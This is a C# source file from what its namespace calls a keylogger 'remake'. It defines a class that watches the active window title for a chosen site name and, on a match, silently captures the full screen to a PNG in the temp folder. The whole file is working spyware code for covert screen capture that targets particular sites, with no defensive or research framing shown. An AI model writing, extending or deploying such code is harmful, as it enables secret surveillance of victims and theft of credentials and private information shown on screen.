using System;
using System.IO;
using System.Drawing;
using System.Windows.Forms;

namespace KeyloggerRemake
{
    public class classScreenshot
    {
        public String strScreenshotWindow = "";
        public String strScreenshotFolder = Path.GetTempPath();
        public String strScreenshotDate = classGetUserInfo.getShortDTime();
        public String strScreenshotName;

        public classScreenshot(String strSiteTitle)
        {
            strScreenshotWindow = strSiteTitle;
            strScreenshotName = strScreenshotWindow + " " + strScreenshotDate;
        }

        public void takeScreenshot()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;

            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
                }
                bitmap.Save(strScreenshotFolder + strScreenshotName + ".png", System.Drawing.Imaging.ImageFormat.Png);
            }
        }

        public static bool detectSpecificWindow(String strSiteTitle)
        {
            if (classGetUserInfo.strCurrentWindow != null && classGetUserInfo.strCurrentWindow.ToLower().Contains(strSiteTitle.ToLower()))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
